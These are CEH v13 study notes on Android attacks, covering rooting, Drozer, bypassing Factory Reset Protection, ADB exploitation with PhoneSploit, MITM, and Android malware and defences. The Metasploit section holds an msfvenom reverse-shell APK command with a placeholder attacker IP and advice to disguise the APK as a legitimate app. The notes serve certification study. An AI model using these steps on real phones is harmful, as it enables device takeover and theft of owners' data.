# Various Android Attacks - CEH v13 Study Notes

## Table of Contents
1. [Android OS Overview](#android-os-overview)
2. [Android OS Architecture](#android-os-architecture)
3. [Android Device Administration API](#android-device-administration-api)
4. [Android Rooting](#android-rooting)
5. [Attack Surface Analysis with Drozer](#attack-surface-analysis-with-drozer)
6. [Bypassing Factory Reset Protection (FRP)](#bypassing-factory-reset-protection-frp)
7. [Mobile Network Security Testing](#mobile-network-security-testing)
8. [Android Exploitation Techniques](#android-exploitation-techniques)
9. [Advanced Android Attack Techniques](#advanced-android-attack-techniques)
10. [Android Malware](#android-malware)
11. [Android Hacking Tools](#android-hacking-tools)
12. [Android-Based Sniffers](#android-based-sniffers)
13. [Securing Android Devices](#securing-android-devices)
14. [Android Device Tracking Tools](#android-device-tracking-tools)
15. [Android Vulnerability Scanners](#android-vulnerability-scanners)
16. [Static Analysis of Android APK](#static-analysis-of-android-apk)
17. [Android Online Analyzers](#android-online-analyzers)
18. [Key CEH v13 Exam Points](#key-ceh-v13-exam-points)

---

## Android OS Overview

### Features
Android is an open-source mobile operating system based on a modified version of the Linux kernel, designed primarily for touchscreen mobile devices. Key features include:

- **Open Source Architecture**: Based on Linux kernel with customizable framework
- **Application Framework**: Rich development environment with extensive APIs
- **Multi-tasking**: True multitasking with process management
- **Security Model**: Sandboxing and permission-based security
- **Hardware Abstraction**: Support for diverse hardware configurations
- **Inter-Process Communication**: Robust IPC mechanisms via Binder
- **Package Management**: APK-based application distribution
- **Runtime Environment**: Dalvik/ART virtual machine execution

---

## Android OS Architecture

The Android architecture consists of six main layers, each providing specific functionality:

### System Apps
- **Pre-installed Applications**: Native apps like Phone, Contacts, Browser, Camera
- **System Services**: Core system functionality providers
- **Package Manager**: Application installation and management
- **Activity Manager**: Application lifecycle management
- **Notification Manager**: System-wide notification handling

### Java API Framework
- **Application Framework**: High-level APIs for app development
- **Content Providers**: Data sharing between applications
- **View System**: UI component framework
- **Resource Manager**: External resource management (images, strings, layouts)
- **Location Manager**: GPS and network-based location services
- **Telephony Manager**: Cellular network communication APIs

### Native C/C++ Libraries
- **Bionic C Library**: Android's custom C library implementation
- **Surface Manager**: Display management and composition
- **Media Framework**: Audio/video codec support (OpenMAX)
- **SQLite**: Embedded database engine
- **WebKit**: Browser engine for web content rendering
- **SSL/TLS Libraries**: Secure communication protocols
- **Graphics Libraries**: 2D/3D graphics rendering (Skia, OpenGL ES)

### Android Runtime (ART)
- **Application Execution**: Java bytecode execution environment
- **Ahead-of-Time Compilation**: AOT compilation for improved performance
- **Garbage Collection**: Memory management and cleanup
- **DEX File Format**: Optimized bytecode format for mobile devices
- **JNI Support**: Native code integration capabilities

### Hardware Abstraction Layer (HAL)
- **Hardware Interface**: Standardized interface between hardware and software
- **Vendor Implementation**: Hardware-specific driver implementations
- **Camera HAL**: Camera hardware abstraction
- **Audio HAL**: Audio hardware management
- **Sensor HAL**: Accelerometer, gyroscope, and other sensor access
- **Graphics HAL**: GPU and display hardware abstraction

### Linux Kernel
- **Process Management**: Task scheduling and process isolation
- **Memory Management**: Virtual memory and page allocation
- **Device Drivers**: Hardware device communication
- **Security Features**: SELinux mandatory access controls
- **Power Management**: Battery and power state management
- **Network Stack**: TCP/IP protocol implementation

---

## Android Device Administration API

The Device Administration API provides system-level device administration capabilities:

- **Policy Enforcement**: Screen lock requirements, password complexity rules
- **Remote Wipe**: Secure device data erasure capabilities
- **Device Encryption**: Full device encryption enforcement
- **Application Management**: App installation/removal restrictions
- **Security Settings**: Firewall rules and security policy implementation
- **Compliance Monitoring**: Device compliance verification and reporting

**Security Implications**:
- Admin privileges can be exploited by malicious applications
- Social engineering attacks targeting admin consent
- Privilege escalation through admin API abuse
- Enterprise security policy bypasses

---

## Android Rooting

Rooting grants superuser access to the Android operating system, removing manufacturer and carrier restrictions.

### Android Rooting with KingoRoot

#### With PC (Computer-Based Rooting)
1. **Preparation Phase**:
   - Enable USB debugging in Developer Options
   - Install ADB drivers on computer
   - Download KingoRoot PC application

2. **Connection Establishment**:
   - Connect device via USB cable
   - Verify device recognition in KingoRoot
   - Enable file transfer mode if required

3. **Rooting Process**:
   - Launch automated rooting sequence
   - Exploit kernel vulnerabilities for privilege escalation
   - Install SuperUser binary and management app
   - Modify system partition for persistent access

4. **Verification**:
   - Install root checker application
   - Verify superuser access functionality
   - Test elevated permission applications

#### Without PC (One-Click Android Rooting)
1. **APK Installation**:
   - Download KingoRoot APK from official source
   - Enable installation from unknown sources
   - Install application on target device

2. **Root Execution**:
   - Launch KingoRoot application
   - Initiate one-click root process
   - Application exploits device-specific vulnerabilities
   - Automatic superuser installation

3. **Post-Root Configuration**:
   - Install root management applications
   - Configure superuser permissions
   - Remove bloatware and system restrictions

### Android Rooting Tools

#### One Click Root Solutions
- **KingRoot**: Universal rooting tool supporting multiple Android versions
- **Framaroot**: Exploit-based rooting for older Android devices
- **Towelroot**: Geohot's rooting solution using kernel exploits
- **SuperSU**: Root access management and binary installation
- **Magisk**: Systemless root solution with module support

**Common Rooting Exploits**:
- DirtyCow (CVE-2016-5195): Kernel privilege escalation
- PingPongRoot: MediaServer vulnerability exploitation
- Stagefright: Media framework buffer overflow exploits
- QuadRooter: Qualcomm driver vulnerabilities

---

## Attack Surface Analysis with Drozer

Drozer allows you to assume the role of an Android app and interact with other apps using Android's Inter-Process Communication (IPC) mechanism and interact with the underlying operating system.

### Drozer Capabilities
- **IPC Endpoint Analysis**: Testing exposed Activities, Services, Content Providers, and Broadcast Receivers
- **Permission Enumeration**: Analyzing application permission models
- **Attack Surface Mapping**: Identifying exploitable application components
- **Data Leakage Testing**: Detecting sensitive information exposure
- **SQL Injection Testing**: Database vulnerability assessment
- **Path Traversal**: File system access vulnerability testing

### Drozer Attack Methodology
1. **Installation and Setup**:
   - Install drozer console on testing machine
   - Install drozer agent on target Android device
   - Establish communication channel via ADB

2. **Application Discovery**:
   ```
   dz> run app.package.list
   dz> run app.package.info -a [package_name]
   ```

3. **Attack Surface Enumeration**:
   ```
   dz> run app.package.attacksurface [package_name]
   dz> run app.activity.info -a [package_name]
   ```

4. **Vulnerability Exploitation**:
   - Content Provider SQL injection testing
   - Activity component access testing
   - Service enumeration and exploitation
   - Broadcast receiver manipulation

---

## Bypassing Factory Reset Protection (FRP)

Factory Reset Protection prevents unauthorized device access after factory reset without Google account credentials.

### Bypassing FRP on Android Phones using 4uKey
1. **Tool Setup**:
   - Install Tenorshare 4uKey for Android
   - Connect target device in download/recovery mode
   - Select appropriate device firmware

2. **FRP Bypass Process**:
   - Select "Remove Google FRP Lock" option
   - Follow device-specific unlock instructions
   - Flash modified firmware or exploit bootloader
   - Reset device configuration without FRP verification

3. **Technical Methods**:
   - **OEM Unlock**: Bootloader unlocking through fastboot
   - **Custom Recovery**: TWRP installation for system modification
   - **ADB Shell**: Direct system file manipulation
   - **Firmware Flashing**: Custom ROM installation bypassing FRP

**Other FRP Bypass Techniques**:
- Samsung FRP bypass using combination key sequences
- LG FRP bypass through accessibility settings
- Emergency call exploitation for settings access
- Bluetooth file transfer method for installing bypass APKs

---

## Mobile Network Security Testing

### Hacking with zANTI and Kali NetHunter

#### zANTI (Network Assessment and Penetration Testing)
zANTI is a comprehensive network diagnostics toolkit that enables complex audits and penetration tests at the push of a button, providing cloud-based reporting with simple guidelines to ensure network safety.

**zANTI Attack Capabilities**:
- **Man-in-the-Middle Attacks**: Network traffic interception and manipulation
- **Password Cracking**: Dictionary and brute-force attacks on network credentials
- **Network Scanning**: Port scanning and service enumeration
- **Vulnerability Assessment**: Automated security flaw detection
- **SSL/TLS Testing**: Certificate validation and encryption analysis
- **Router Exploitation**: Default credential testing and firmware vulnerability exploitation

#### Kali NetHunter
Advanced Android penetration testing platform with full Kali Linux tool integration.

**NetHunter Attack Vectors**:
- **Wireless Attacks**: WiFi network exploitation and monitoring
- **HID Attacks**: USB Human Interface Device payload delivery
- **BadUSB**: USB device firmware exploitation
- **Social Engineering**: Phishing and pretexting attack frameworks
- **MITM Attacks**: Network traffic interception using mobile device
- **Forensic Analysis**: Mobile device data extraction and analysis

---

## Android Exploitation Techniques

### Exploiting Android Device through ADB using PhoneSploit Pro

PhoneSploit Pro is an offensive security tool that exploits Android devices through ADB (Android Debug Bridge) connections.

#### PhoneSploit Pro Attack Methods
1. **ADB Connection Establishment**:
   - Network-based ADB connection over WiFi
   - USB debugging exploitation
   - Wireless ADB activation through initial physical access

2. **Device Control Capabilities**:
   - Remote shell access execution
   - File system browsing and manipulation
   - Screen capture and recording
   - Application installation and removal
   - System setting modification

3. **Data Extraction**:
   - SMS and call log extraction
   - Contact information harvesting
   - Installed application enumeration
   - System information gathering
   - Location data extraction

### Launching MTM (Man-in-the-Middle) Attack
1. **Network Position Establishment**:
   - ARP spoofing to position device as gateway
   - DNS server modification for traffic redirection
   - SSL certificate replacement for HTTPS interception

2. **Traffic Interception**:
   - HTTP/HTTPS traffic capture and analysis
   - Credential harvesting from unencrypted communications
   - Session token extraction and replay
   - Form data interception and manipulation

### Launching Spearphone Attack
Spearphone attacks exploit accelerometer data to infer speech patterns and potentially reconstruct conversations.

1. **Sensor Data Collection**:
   - Accelerometer data sampling during phone calls
   - Gyroscope data correlation for improved accuracy
   - Machine learning model application for speech reconstruction

2. **Audio Reconstruction**:
   - Vibration pattern analysis from device sensors
   - Speech pattern inference from accelerometer fluctuations
   - Noise filtering and signal processing for audio clarity

### Exploiting Android Device using Metasploit
1. **Payload Generation**:
   ```
   msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -o payload.apk
   ```

2. **Social Engineering Delivery**:
   - APK disguised as legitimate application
   - Email attachment or malicious download link
   - USB drop attacks in physical locations

3. **Meterpreter Session Establishment**:
   - Reverse shell connection to attacker machine
   - Persistent access through service installation
   - Anti-forensics and log cleanup capabilities

4. **Post-Exploitation**:
   - Privilege escalation through local exploits
   - Lateral movement to connected devices
   - Data exfiltration and persistence maintenance

---

## Advanced Android Attack Techniques

### Advanced SMS Phishing
- **Smishing Campaigns**: Targeted SMS messages with malicious links
- **SIM Box Fraud**: Illegitimate SMS routing through SIM card farms
- **Premium Rate SMS**: Unauthorized subscription to expensive SMS services
- **Two-Factor Authentication Bypass**: SMS-based 2FA interception

### Bypass SSL Pinning
1. **Runtime Manipulation**:
   - Frida framework for dynamic SSL pinning bypass
   - Xposed module installation for system-level SSL modification
   - Certificate pinning validation function hooking

2. **Static Analysis Approach**:
   - APK decompilation and SSL pinning code identification
   - Certificate validation logic modification
   - Application repackaging with modified SSL handling

3. **Network-Level Bypass**:
   - Proxy tool configuration (Burp Suite, OWASP ZAP)
   - Custom certificate authority installation
   - Traffic routing through SSL-stripping proxies

### Tap 'n' Ghost Attack
Exploitation of NFC (Near Field Communication) vulnerabilities:
- **NFC Tag Manipulation**: Malicious payload delivery through NFC tags
- **Android Beam Exploitation**: Unauthorized data transfer via NFC
- **Payment System Attacks**: Credit card information theft through NFC readers
- **Access Control Bypass**: NFC-based door locks and security system exploitation

---

## Android Malware

### Recent Android Malware Families

#### Mamont
- **Functionality**: Banking trojan targeting financial applications
- **Infection Vector**: Malicious APK downloads and phishing campaigns
- **Capabilities**: Overlay attacks, credential theft, SMS interception
- **Persistence**: System application disguise and admin privilege abuse

#### SecuriDropper
- **Type**: Dropper malware for secondary payload delivery
- **Distribution**: Third-party app stores and malicious advertisements
- **Techniques**: Code obfuscation and anti-analysis evasion
- **Payloads**: Banking trojans, ransomware, and spyware deployment

#### Dwphon
- **Category**: Remote Access Trojan (RAT)
- **Features**: Device control, data theft, surveillance capabilities
- **Communication**: Command and control server communication
- **Evasion**: Legitimate application mimicry and permission abuse

#### DogeRAT
- **Characteristics**: Multi-functional remote access tool
- **Capabilities**: File management, camera access, SMS control
- **Targeting**: Individual users and small businesses
- **Installation**: Social engineering and malicious downloads

#### Tambir
- **Type**: Information stealer malware
- **Focus**: Cryptocurrency wallet and exchange application targeting
- **Methods**: Keylogging, screen capture, clipboard monitoring
- **Monetization**: Cryptocurrency theft and account takeover

#### SunnyBot
- **Classification**: Banking malware with bot capabilities
- **Features**: Web injection, SMS interception, call recording
- **Command Structure**: Botnet participation and remote control
- **Target**: Financial institutions and mobile banking applications

---

## Android Hacking Tools

### AndroRAT
- **Category**: Remote Administration Tool for Android
- **Features**: SMS management, call recording, GPS tracking, camera access
- **Installation**: APK binding with legitimate applications
- **Communication**: HTTP/HTTPS command and control protocol

### Ghost Framework
- **Purpose**: Comprehensive Android device exploitation framework
- **Modules**: Multiple attack vectors and post-exploitation tools
- **Interface**: Command-line interface with scripting capabilities
- **Features**: Device enumeration, payload generation, session management

### Gallery Eye
- **Function**: Image and media file analysis tool
- **Capabilities**: EXIF data extraction, geolocation information recovery
- **Forensics**: Digital evidence collection from media files
- **Privacy**: Social media photo metadata analysis

### mSpy
- **Type**: Commercial monitoring and surveillance software
- **Features**: Call monitoring, message tracking, location surveillance
- **Legality**: Parental control and employee monitoring applications
- **Installation**: Physical device access required for installation

### HackingTOOLkit
- **Description**: Collection of penetration testing tools for Android
- **Components**: Network scanners, vulnerability assessment tools
- **Usage**: Security testing and ethical hacking purposes
- **Platform**: Android-based security testing suite

### Hxp_photo_eye
- **Functionality**: Advanced photo and image analysis tool
- **Analysis**: Metadata extraction, facial recognition, location tracking
- **Intelligence**: Social media photo analysis and OSINT gathering
- **Privacy**: Personal information extraction from image data

---

## Android-Based Sniffers

### PCAPdroid
- **Description**: Open-source packet capture tool for Android
- **Features**: Real-time network traffic monitoring without root
- **Protocols**: HTTP, HTTPS, DNS, TCP/UDP packet analysis
- **Export**: PCAP file generation for external analysis tools

### netCapture
- **Type**: Network traffic interception tool
- **Capabilities**: WiFi and cellular network monitoring
- **Analysis**: Protocol analysis and traffic pattern identification
- **Root Requirement**: Requires rooted device for full functionality

### Intercepter-NG
- **Category**: Advanced network protocol analyzer
- **Features**: Man-in-the-middle attack automation
- **Protocols**: Multiple protocol support including SSH, FTP, HTTP
- **Attack Tools**: Built-in password recovery and network attack modules

### Packet Capture
- **Function**: Lightweight packet sniffing application
- **Usage**: Network troubleshooting and security analysis
- **Interface**: User-friendly GUI for packet inspection
- **Formats**: Multiple export formats for further analysis

### Sniffer Wicap 2
- **Purpose**: WiFi network packet capture and analysis
- **Requirements**: Monitor mode capable wireless adapter
- **Features**: 802.11 frame analysis and wireless security testing
- **Compatibility**: Various Android device and chipset support

---

## Securing Android Devices

### Security Hardening Measures
- **Device Encryption**: Full disk encryption for data protection
- **Screen Lock**: Strong PIN, pattern, password, or biometric authentication
- **Application Verification**: Google Play Protect and third-party scanning
- **System Updates**: Regular security patch installation
- **Permission Management**: Granular application permission control
- **Unknown Sources**: Disable installation from unknown sources
- **Remote Wipe**: Device location and remote wipe capability configuration
- **Network Security**: VPN usage and secure WiFi practices

### Enterprise Security Controls
- **Mobile Device Management (MDM)**: Centralized device policy enforcement
- **Mobile Application Management (MAM)**: Application-level security controls
- **Containerization**: Work and personal data separation
- **Certificate Management**: Enterprise certificate deployment
- **Compliance Monitoring**: Device compliance verification and reporting

---

## Android Device Tracking Tools

### Google Find My Device
- **Official Tool**: Google's native device location service
- **Features**: Device location, remote lock, data wipe capabilities
- **Requirements**: Google account and location services enabled
- **Accuracy**: GPS, WiFi, and cellular triangulation for location

### Find My Phone (Third-Party Solutions)
- **Variety**: Multiple third-party tracking applications available
- **Features**: Anti-theft protection, remote photography, alarm triggers
- **Privacy**: Varying privacy policies and data collection practices
- **Effectiveness**: Dependent on device configuration and network connectivity

---

## Android Vulnerability Scanners

### Quixxi App Shield
- **Purpose**: Mobile application security testing platform
- **Analysis**: Static and dynamic analysis capabilities
- **Vulnerability Detection**: OWASP Mobile Top 10 compliance checking
- **Reporting**: Comprehensive security assessment reports

### Android Exploits (Vulnerability Databases)
- **CVE Databases**: Common Vulnerabilities and Exposures tracking
- **Exploit-DB**: Public exploit code repository
- **Security Advisories**: Vendor security bulletins and patches
- **Research Publications**: Academic and industry security research

### Yazzhini
- **Type**: Android security assessment tool
- **Scanning**: Automated vulnerability detection and classification
- **Coverage**: Application and system-level security testing
- **Integration**: CI/CD pipeline integration for automated testing

### Vulners Scanner
- **Platform**: Vulnerability intelligence and scanning platform
- **Database**: Comprehensive vulnerability database with exploit correlation
- **API**: Integration capabilities for automated security testing
- **Coverage**: Operating system and application vulnerability detection

---

## Static Analysis of Android APK

### MobSF (Mobile Security Framework)
- **Description**: Comprehensive mobile application security testing framework
- **Analysis Types**: Static, dynamic, and interactive analysis capabilities
- **Supported Formats**: APK, IPA, and Windows Phone applications
- **Features**: Code analysis, privacy analysis, malware detection

#### MobSF Analysis Capabilities
1. **Code Review**:
   - Source code security flaw identification
   - Hardcoded credential detection
   - Cryptographic implementation analysis
   - Permission usage evaluation

2. **Binary Analysis**:
   - APK structure examination
   - Certificate and signature verification
   - Resource file analysis
   - Native library assessment

3. **Privacy Analysis**:
   - Data collection practice identification
   - Third-party SDK analysis
   - Network communication inspection
   - Permission correlation analysis

---

## Android Online Analyzers

### Sixo Online APK Analyzer
- **Service**: Web-based APK analysis platform
- **Features**: Automated security assessment and malware detection
- **Reports**: Detailed analysis reports with security recommendations
- **Accessibility**: No installation required, browser-based interface

### ShenameApp
- **Platform**: Online mobile application security analysis
- **Capabilities**: Static analysis and vulnerability identification
- **Coverage**: Android and iOS application support
- **Integration**: API access for automated security testing

### Koodous
- **Community**: Collaborative malware analysis platform
- **Database**: Extensive APK sample repository
- **Analysis**: Community-driven analysis and threat intelligence
- **Features**: YARA rule creation and sharing for malware detection

### Android APK Decompiler
- **Tool**: Online APK reverse engineering platform
- **Functionality**: Java source code recovery from APK files
- **Formats**: Multiple output formats including Java and Smali
- **Limitations**: Limited by code obfuscation and protection measures

### DeGuard
- **Purpose**: Android application deobfuscation tool
- **Capability**: ProGuard obfuscation reversal
- **Analysis**: Improved code readability for security analysis
- **Integration**: Compatible with other static analysis tools

---

## Key CEH v13 Exam Points

### Critical Concepts
1. **Android Architecture**: Deep understanding of all six layers and their security implications
2. **Attack Surface Analysis**: Comprehensive knowledge of Android attack vectors and entry points
3. **Rooting Techniques**: Multiple rooting methods and their security ramifications
4. **Mobile Malware**: Current Android malware families and their characteristics
5. **Penetration Testing**: Android-specific testing methodologies and tools
6. **Security Controls**: Enterprise and personal Android security measures
7. **Forensic Analysis**: Android device investigation and evidence collection

### Exam Focus Areas
* **OWASP Mobile Security**: Android-specific implementation of mobile security principles
* **Vulnerability Assessment**: Systematic identification of Android security weaknesses
* **Exploitation Techniques**: Practical attack execution against Android platforms
* **Security Testing Tools**: Proficiency with Android security testing frameworks
* **Incident Response**: Android-specific security incident handling procedures
* **Compliance Requirements**: Understanding regulatory frameworks for mobile security
* **Threat Intelligence**: Current Android threat landscape and emerging attacks

### Practical Skills
* Perform comprehensive Android security assessments using multiple tools
* Identify and exploit Android application vulnerabilities
* Analyze Android malware samples and attack vectors
* Implement appropriate security controls for different Android environments
* Conduct Android device forensics and evidence preservation
* Evaluate Android security posture using automated and manual techniques
* Develop Android security testing methodologies and procedures

### Important Technologies to Master
* **Android Development**: Understanding APK structure, manifest files, and component interactions
* **Reverse Engineering**: APK decompilation, code analysis, and obfuscation techniques
* **Network Security**: Android network communications and protocol analysis
* **Cryptography**: Android cryptographic implementations and key management
* **Enterprise Mobility**: MDM, MAM, and enterprise Android security solutions
* **Forensic Tools**: Android device imaging, data extraction, and analysis techniques
* **Vulnerability Research**: Android exploit development and security research methodologies
